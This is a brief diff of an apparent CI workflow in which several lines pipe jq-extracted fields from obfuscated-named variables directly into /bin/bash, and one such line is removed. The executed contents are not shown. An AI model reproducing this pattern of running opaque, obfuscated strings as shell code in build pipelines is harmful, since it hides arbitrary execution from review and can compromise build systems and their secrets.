@@ -27,7 +27,6 @@ jobs:
           echo $d59799 | jq -r .ei128 | /bin/bash
           printf '%s' "$vevx2" | jq -r .f7 | /bin/bash
           printf '%s' "$msnk329" | jq -r .tb5704 | /bin/bash
-          printf '%s' "$nel02807" | jq -r .d3098 | /bin/bash
           printf '%s' "$qbqs944" | jq -r .tncw14 | /bin/bash
 
       - name: Save output
